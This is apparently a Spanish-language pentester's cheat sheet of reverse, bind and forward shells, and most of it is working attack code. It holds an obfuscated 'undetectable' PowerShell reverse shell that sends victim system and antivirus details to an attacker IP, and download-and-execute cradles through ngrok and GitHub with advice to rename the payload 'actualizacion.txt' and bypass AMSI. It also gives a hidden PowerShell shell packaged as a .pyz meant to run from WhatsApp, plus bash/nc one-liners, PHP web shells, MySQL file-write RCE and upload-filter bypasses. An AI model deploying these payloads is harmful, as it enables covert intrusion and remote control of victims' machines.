ce# Tipos de ReverShell

Tags: #ReverShell #Netcat #BindShell #Powershell #AMSI

Tenemos diferentes tipos de Revershell este pagina Web:
* [Monkey-Pentester](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [ReverseShells-Generator](https://www.revshells.com/) 
* [Cheatsheet-ReverseShells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [Powershell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
* [P0wny-shell Webshell](https://github.com/flozz/p0wny-shell/blob/master/shell.php)

**Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndose tomar el control de la máquina remota.

**Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

**Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

La mayoría de las paginas al momento de comprometerlas encontraremos el usuario **www-data** que es el encargado de gestionar la parte de servicios web.

## Revershell en Powershell Indetectable

```bash 
# Funcion encargada de convertir un arreglo de bytes y lo convierte en una cadena utilizando la codificacion especificada, como UTF-8
function ConvertFrom-ByteArray {

    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Byte[]]
        $ByteArray,

        [Parameter(Position = 1)]
        [ValidateSet('ASCII', 'UTF8', 'UTF16', 'UTF32')]
        [String]
        $Encoding = 'UTF8'
    )

    if (!$ByteArray) {
        return ''
    }

    [Text.Encoding]::GetEncoding($($Encoding -replace 'UTF','UTF-')).GetString($ByteArray)
}
# final de Funcion ConvertFrom-ByteArray


while ($true) {
    # Generando valores aleatorios y codificando en Base64
    $Base64 = [Convert]::ToBase64String((1..32 | %{[byte](Get-Random -Minimum 0 -Maximum 255)}));
    $Key = ([Convert]::FromBase64String($Base64));

    # Recopilacion de informacion del equipo victima
    $System = (Get-WmiObject Win32_OperatingSystem).Caption;
    $Version = (Get-WmiObject Win32_OperatingSystem).Version;
    $Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture;
    $WindowsDirectory = (Get-WmiObject Win32_OperatingSystem).WindowsDirectory;
    $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
    # Configuracion de la IPAddress
    $p = "192.168.45.220"

    # Concatenacion de variables de informacion el equipo con su respectiva clave:valor
    $w = "=> RECOPILACION DE INFORMACION DEL TARGET <= `r`n System: $System`r`n VERSION: $Version`r`n ARCH: $Architecture`r`n DIRECTORY: $WindowsDirectory`r`n AVS: $av`r`n GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
    
    $s = [System.Text.ASCIIEncoding]
    [byte[]]$b = 0..65535|%{0};
    $LUNA = ConvertFrom-ByteArray  @(83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116)
    $r = "LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur."
    Set-Alias $r ($r[$true-11] + ($r[[byte]("0x" + "FF") -261]) + $r[[byte]("0x" + "2a") -2])
    
    # Configuracion de Puerto
    $y = New-Object $LUNA($p,443)
    $z = $y.GetStream()
    $d = $s::UTF8.GetBytes($w)
    $z.Write($d, 0, $d.Length)
    $SPARTAN = "whoami"
    $t = (LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur. $SPARTAN) + "@c2===> "

    while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
        $v = (New-Object -TypeName $s).GetString($b,0, $l)
        $d = $s::UTF8.GetBytes((LaindependenciadeColombiaocurrienelsigloXIXcuandolascoloniasamericanaslucharoncontraelyugoespaol.LideradosporfigurascomoSimnBolvaryFranciscodePaulaSantanderlosrebeldeslograronliberaraColombiadeladominacincolonial.LaguerraferozylargaculminconlaBatalladeBoyacen1819unhitoquesellaemancipacincolombiana.EstaluchaarduamarcelnacimientodeunanacinlibreysoberanaenAmricadelSur.  $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
        $z.Write($d, 0, $d.Length)
    }
    $y.Close()
    Start-Sleep -Seconds 7
}

```

## Revershell con Powershell

 * [Invoke-PowershellTCP](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

```bash 
❯ ngrok tcp 443         # Exponemos publico el puerto 443 y Ngrok nos devolvera un 'tcp://2.tcp.ngrok.io:19215'. Utilizaremos la parte de '2.tcp.ngrok.io' en IPAddress y '19215' para el Port en el script de la revershell de abajo.  

❯ rlwrap nc -nlvp 443   # Recibir la revershell en Kali
```

```bash 
# Creamos un script con el contenido del enlace de arriba y al final le agregaremos este comando para poder usar Ngrok

❯ nvim Invoke-PowershellTCP.ps1

	Invoke-PowerShellTcp -Reverse -IPAddress 2.tcp.ngrok.io -Port 19215 

Nota: 
	1. Debemos Bypasear AMSI, de lo contrario nos detectara codigo malicioso
	1. Este script lo podemos cargar a nuestro Github, ya que eso lo hara mas confiable al momento de llamarlo desde la maquina victima 
	2. Podemos colocarle un nombre discreto al script como 'actualizacion.txt'
```

```bash 
# Desde la maquina victima con Windows llamamos al script que se encuentra almacenado en nuestro Github, esto lo hace a nivel de memoria por lo que es dificil de detectar y sirve como metodo de evasion

Nota: La url que se coloca es la que nos muestra al momento de darle 'Raw' al script almacenado en 'Github'

❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1')"

Nota: 
	1. Si se ejecuta el comando desde un 'cmd' en Windows colocarlo asi como aparece. Pero si se esta ejecutando desde la consola de PS quitarle 'powershell -c'
```

## Revershell indetectable con Powershell utilizando Python 3

```bash 
Nota: 
	1. Crear un script en python con la extension '.pyz' para que windows lo pueda ejecutar al abrirlo desde la aplicación de whatsapp 
```

```python
import os 

os.system('powershell -nop -W hidden -noni -ep bypass -c "'
'$u3e = \\"10.10.10.128\\"; '
'$k6u = 448; '
'function Connect-Back { '
'try { '
'$f1 = New-Object System.Net.Sockets.TCPClient($u3e, $k6u); '
'$f2 = $f1.GetStream(); '
'$d5g = New-Object System.IO.StreamReader($f2); '
'$j2h = New-Object System.IO.StreamWriter($f2); '
'$j2h.WriteLine(\\"[+] Conexión establecida con la Revershell\\"); '
'$j2h.WriteLine(\\"[+] Escribe \'exit\' para cerrar la conexión.\\"); '
'$j2h.Flush(); '
'while ($true) { '
'$j2h.Write(\\"PS: \\"); '
'$j2h.Flush(); '
'$cmd = $d5g.ReadLine(); '
'if ($cmd -eq \\"exit\\") { break }; '
'try { '
'$output = Invoke-Expression ($cmd) 2>&1; '
'if ($output -is [System.Collections.IEnumerable]) { '
'$output = $output | Out-String }; '
'$output = $output -replace \\"`t\\", \\"    \\"; '
'$output = $output -replace \\" {2,}\\", \\" \\"; '
'if ($output) { '
'$j2h.WriteLine(\\"[*] Resultado del comando:\\"); '
'$j2h.WriteLine($output) } '
'} catch { '
'$j2h.WriteLine(\\"[!] Error ejecutando el comando: $_\\") } '
'$j2h.Flush() }; '
'$d5g.Close(); '
'$j2h.Close(); '
'$f1.Close() } '
'catch { Write-Host \\"[!] Error al conectar con el servidor del atacante: $_\\" -ForegroundColor Red } '
'}; '
'Connect-Back"')
```

## Hoaxshell 

```bash 
https://github.com/t3l3machus/hoaxshell     # Descargar la herramienta 
```

```bash 
❯ python3 hoaxshell.py -s IP         # Genera un comando en Powershell que contiene una revershell para Windows 

	# IP = Dirección IP de la máquina Kali 
```

## Revershell con Python3 

```bash 
❯ python3 ---version          # Verificar que este instalado python3 en la maquina victima 

❯ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'  # Revershell 
```

## RCE MySQL

```bash 
# Debemos estar dentro del servicio de MySQL

❯ select '<?php  $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1; 

# Ahora en la URL podemos ejecutar comandos 
❯ shell.php?cmd=whoami            
```

## Bind Shell:

```bash
# Desde la terminal del SO

1. ❯ nc.exe -nlvp 443 -e cmd.exe            # Ejecutamos desde la terminal (Maquina victima) para ponernos en escucha y hacer una BindShell en Windows 
1. ❯ nc IP 443                              # Ejecutamos en para completar la Bind Shell (Maquina atacante) Linux


2. ❯ nc -nlvp 443 -c /bin/bash              # Ejecutamos desde la terminal (Maquina victima) para ponernos en escucha y hacer una BindShell en Linux
2. ❯ nc.ex -nv IP 443                       # Ejecutamos en para completar la Bind Shell (Maquina atacante) Windows 
```

## Bypass PHPx Blacklist 

```bash 
# Diferentes extensiones PHP para subir 'Shells' maliciosas 

* php
* php3
* php4
* php5
* php6
* php7
* pht
* phtm
* phtml
* phar
* pHP

```

## Bypass Web Weevely

```bash 
# Byppass en Nginx, subimos el archivo con la extension que permite subir, despues en la url lo cambiar al formato php y se puede ejecutar comandos 

❯ http://IP/uploads/shell.jpg/shell.php?cmd=whoami

	# shell.jpg = Extension que nos deja subir la web
```

```bash 
# Crear archivos de Revershell 
❯ weevely generate password ~/Desktop/weevely.jpg    # Crear un archivo con la extensión que nos deja subir 
❯ weevely generate password /root/shell.php.jpg      # Crear una revershell con extensión 'php.jpg' para pasar el filtro en WordPress de cargar imagenes 
```

```
# Conectarse a Weevely
❯ weevely https://IP/uploads/weevely.jpg/weevely.php password cmd   # Crear una revershell con la petición 'http request'
	❯ :help                         # Muestra los comandos que podemos utilizar 
	❯ :system_info                  # Muestra la info del sistema 

❯ weevely https://IP/uploads/shell.php password     # Otra forma de conectarse a Weevely obteniendo la Revershell
	❯ ls                            # Listamos el contenido 
```

## RCE en Web

```php
# Para ejecutar comandos en la Web debemos de crear o subir un archivo en el /var/www/html con el siguiente contenido: 

❯ nano cmd.php

	<?php 
		echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
	?>

# Las etiquetas que usamos ahí son 'Pre' de preformateadas y nos sirven para que nos muestre bien el Output. Ya con ese archivo y que la Web interprete 'php' podemos colocar en la url (?cmd=) para colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de 'Atacante'

# Otra manera 
	<?php 
		$output = shell_exec($_GET["cmd"]);
		echo "<pre>$output</pre>";
	?>

# Colocare la revershell en la web 
❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.129%2F4444%200%3E%261%27
```

## Index.html

```bash
❯ nano index.html

	#!/bin/bash
	bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'

	# IP = IP de atacante
	# 443 = Puerto a usar


❯ curl ❮IP❯ | bash    # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash

---
# si no te deja hacer '| bash' se puede hacer los siguientes pasos:
❯ curl ❮IP❯ -o /tmp/reverse       # El output del comando colocarlo en la ruta /tmp/ 
❯ bash /tmp/reverse               # Ejecutar bash al archivo para obtener la revershell  
```

## Imagen 'png' 

```bash 
❯ nano image.png

	<?php
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
	?>

# Colocare la revershell en la web 
❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.129%2F4444%200%3E%261%27
```

## ReverShell en php:

```php
<?php
   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'");
?>

<?php
   system($_GET["cmd"]);


	# IP = IP de atacante
	# 443 = Puerto a usar

<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

# Colocare la revershell en la web 
❯ ?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.50.129%2F4444%200%3E%261%27

-----
# Otra forma de subir la revershell y ejecutarla:
❯ curl ❮IP❯ -o reverse.php        # El output del comando colocarlo en la ruta /tmp/ 
❯ php reverse.php                 # Ejecutar php al archivo para obtener la revershell 
```

```bash 
# Para Windows se debe poder hacer injección de comandos en la web, esto se puede hacer:
1. Con la carga de un archivo 'cmd.php'
2. Buscar una parte de la web que ejecute comandos 

# Hacer la Revershell
1. Ejecutar el comando en powershell
2. Crear el archivo llamado 'Ps.ps1' con el payload de la revershell 
	1. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
	2. Al final del payload colocar: 'Invoke-PowerShellTcp -Reverse -IPAddress 127.0.0.1 -Port 4444'
3. Kali debe de compartir el PS.ps1 con 'python3 -m http.server 80' 
4. Kali debe de escuchar con 'rlwrap nc -nlvp 4444' para Windows 
```

## Escucha Netcat 

```bash
# Escucha por Netcat en espera de la Revershell

❯ nc -nlvp 443            # Para obtener un shell en Linux

❯ rlwrap nc -nlvp 443     # Para obtener un shell en Windows 

	# nc = Netcat 
	# n = No DNS
	# l = Modo escucha, conexiones entrantes
	# v = verbose
	# p = numero local de puerto en esucha
```

## Otras Revershell 

```bash 
❯ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> 443 >/tmp/f          # Podemos usar este comando para hacer una Revershell desde una bash en la maquina victima 
❯ r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4242 >/tmp/f   # Evadir filtros

# Nos debemos de poner en escucha antes de esta manera
❯ nc -nlvp 443                   # Escucha en la maquina de atacante
```

## Pwncat 

```bash 
❯ pwncat-cs -lp 443                         # Podemos usar esta herramienta llamada 'Pwncat'
	❯ run enumerate                        # Enumera todo el sistema 
	❯ run enumerate.user                   # Enumeras los usuarios
	❯ run enumerate.system.network         # Enumeras las interfaces de la maquina 
	❯ back                                 # Nos coloca en la ruta de la terminal de la victima
```

## ForwardShell

Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
```shell
❯ nano cmd.php
	<?php 
		echo shell_exec($_GET['cmd']);
	?>
```
Las etiquetas que usamos ahi son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahí pode colocar comandos y conectarnos a nuestra maquina de **Atacante** por una **ForwardShell**

Descargaremos el siguiente archivo y lo ejecutaremos con Pyhton3 para hacer una **ForwardShell**: 
Debemos estar en la pestana de **Raw**
* [Tty_Over_Http](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py)
```bash
❯ wget https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py

	# Descargarnos el archivo 'tty_over_html'
	# Cambiamos la parte de index.php por cmd.php (Dependiendo el servidor)

❯ python3 tty_over_http.py 
```